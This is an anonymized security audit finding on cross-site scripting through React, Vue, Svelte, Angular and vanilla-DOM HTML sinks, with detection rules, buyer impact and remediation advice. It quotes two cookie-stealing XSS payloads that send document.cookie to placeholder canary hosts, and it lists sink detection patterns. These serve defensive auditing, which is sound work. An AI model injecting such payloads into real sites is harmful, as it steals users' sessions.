---
finding_category: security
severity_observed: high
remediation_effort: M
detection_method: hybrid
anonymized: true
contributed_by: free-guy-internal
source_audit: 2026-05-22-batch (anonymized; 5/10 incidence)
---

# Cross-site scripting via `dangerouslySetInnerHTML` (or framework equivalent)

## What the audit found

Five audits in the same batch of ten. Different stacks (React, Vue with `v-html`, Svelte with `{@html}`, Angular with `bypassSecurityTrustHtml`, vanilla DOM with `element.innerHTML`). The same pattern in every one: at least one component or template rendered HTML constructed from data that originated outside the trust boundary, without sanitization between the source and the sink.

The variations were instructive:

- One React commerce repo rendered seller-supplied product descriptions via `<div dangerouslySetInnerHTML={{ __html: product.description }} />`. The product-description field accepted any HTML from the seller's vendor dashboard with no server-side sanitization. The audit submitted a description containing `<img src=x onerror="fetch('https://canary.example.com/' + document.cookie)">` and watched the script fire in the buyer's session on the product page.
- One Vue dashboard repo used `<div v-html="user.bio">` to render user-supplied profile bios. The bio field passed through a server-side "strip tags" function that handled `<script>` but missed `<svg onload>`, `<img onerror>`, and the dozen other XSS vectors that do not use the literal `script` tag.
- One Angular admin tool repo bypassed the framework's default sanitization with `this.sanitizer.bypassSecurityTrustHtml(notification.body)` because the team had hit a styling problem and wanted to render rich-text notifications. The notification body originated from an upstream email-ingestion service that the team trusted. The upstream service did not sanitize its own input.
- One Svelte marketing site repo rendered CMS-supplied blog content via `{@html post.content}` from a CMS that lacked an XSS-aware editor configuration. The CMS allowed arbitrary `<style>` and `<iframe>` tags, both of which were used in the audit's proof-of-exploitation.
- One vanilla DOM repo built notification toasts via `toast.innerHTML = template.replace('{{message}}', message)` where `message` was the API error message returned from the server. A crafted API response (the audit reached the path via a separate finding) produced an XSS in every authenticated user's browser the next time the operation failed.

In four of the five cases the rendered surface was authenticated and the XSS payload would execute in a logged-in user's session, granting session-token theft, account modification on behalf of the victim, or arbitrary action under the victim's authority.

## How the audit caught it

The security specialist runs a hybrid pass: static analysis to identify candidate sinks, then content-flow analysis to determine whether user input reaches them.

The static pass uses a Semgrep ruleset tuned for each framework's HTML-injection sinks:

- React: `dangerouslySetInnerHTML={{ __html: ... }}`
- Vue: `v-html="..."`
- Svelte: `{@html ...}`
- Angular: `bypassSecurityTrustHtml(...)` and the `[innerHTML]` binding without a `DomSanitizer` pipe
- Vanilla DOM: `element.innerHTML = ...`, `element.outerHTML = ...`, `document.write(...)`
- Templating engines: `{{{...}}}` in Mustache or Handlebars, `{% autoescape false %}` blocks in Jinja2 or Django templates, `<%= raw %>` in ERB, `<?= ... ?>` outside of a sanitization wrapper in PHP

Each match emits a MEDIUM finding. The flow-analysis pass then traces the rendered value back to its origin. A value that originates from user input (a form submission, a URL parameter, a database row populated by user input, an upstream API response not under the team's control) escalates the finding to HIGH.

The dynamic pass, when the deep audit includes live-endpoint checks, injects a canary XSS payload (`<img src=x onerror="navigator.sendBeacon('https://canary.invalid/' + document.cookie)">`) through the identified input path and inspects the rendered page for unescaped execution. A confirmed dynamic injection escalates to HIGH with a captured proof of exploitation.

## Why it matters to a buyer

Three reasons, in ascending order of cost.

First, the exploitation primitive. A persistent XSS on an authenticated surface is the cleanest possible session-hijacking attack. The attacker submits a payload once, every subsequent user who renders the affected surface executes the script in their own session, the script exfiltrates session tokens or performs actions on the user's behalf, the attacker now holds N sessions for the cost of one submission. The persistent variant scales linearly with the number of users; the reflected variant requires a phishing component but is still trivial.

Second, the trust-boundary failure. The XSS finding is a documented signal that the team's input-validation discipline operates at the wrong layer. The fix is not "sanitize this one field" but "establish a sanitization boundary between any user-controlled input and any HTML-rendering sink, and enforce the boundary in code review and CI." That is architectural work, not a one-line patch. Buyers' diligence teams will read a single XSS finding as evidence of the broader architectural gap and will probe other surfaces for the same class.

Third, the compliance overlay. PCI DSS, SOC2, and the OWASP Application Security Verification Standard all treat XSS as a fundamental finding. An XSS path on a checkout flow, a session-management surface, or an admin tool will appear in any third-party penetration test the buyer commissions post-close. The buyer planning to take the product through SOC2 Type 2 will need to remediate before the audit window opens. Realistic dollar impact: $5K to $25K of engineering work for a single-surface fix, escalating to $50K-plus for an architectural sanitization-boundary refactor across a meaningfully-sized React or Vue codebase.

## Recommended remediation

In order, all of these need to happen:

1. **Patch the specific surface immediately.** Wrap the rendered value in a server-side or client-side sanitizer (`DOMPurify` for browser code, `bleach` for Python, `sanitize-html` for Node) with a strict allowlist of permitted tags and attributes. The allowlist should be no broader than the application's actual rich-content needs.
2. **Sweep the codebase for the same sink pattern.** Use the same Semgrep ruleset the audit used to find every instance of `dangerouslySetInnerHTML`, `v-html`, `{@html}`, and equivalents. Treat every instance as suspect until the flow-analysis pass confirms it is fed from a sanitized source.
3. **Establish the sanitization boundary explicitly.** Decide whether sanitization happens on input (when the data is stored) or on output (when the data is rendered). Both are valid; pick one and apply it uniformly. Output-side sanitization is generally more defensible because it survives changes in storage and ingestion paths.
4. **Add a Content Security Policy (CSP).** A restrictive CSP (`script-src 'self'; object-src 'none'; base-uri 'self'`) substantially blunts the impact of any XSS that does land. CSP is defense in depth; it does not replace the sanitization fix but it does contain the blast radius of any missed instance.
5. **Add a CI scan.** The Semgrep ruleset runs on every push and fails the build if any new component introduces a sink without an obvious sanitization wrapper. The first regression then surfaces as a failed build, not as an audit finding.

## How the seller could have prevented this

The structural prevention is to never use the framework's HTML-injection sink in the first place. React, Vue, and Svelte all escape their default text interpolations; the only way to introduce an XSS is to deliberately bypass the default. A team that treats `dangerouslySetInnerHTML` and its equivalents as "requires architectural sign-off" produces approximately zero XSS findings.

The behavioral prevention, for teams that genuinely need to render rich content (CMS blog posts, user-supplied formatting, embedded media), is a single sanitization wrapper component that every rich-content surface routes through. The wrapper is the only place in the codebase that ever calls `dangerouslySetInnerHTML`. Audits then find one sink in the entire codebase instead of dozens, and the audit conversation reduces to "is the wrapper's allowlist correct."

The seller who has done neither faces a multi-week sweep through the codebase to find every sink, audit every flow that reaches it, and add sanitization at the right layer, plus the architectural conversation about why the team kept reaching for the sink in the first place. The seller who has done the structural prevention arrives at exit with one or zero HTML-injection sinks in the entire codebase, a documented sanitization architecture in the data room, and one fewer high-severity finding to remediate under deal pressure.
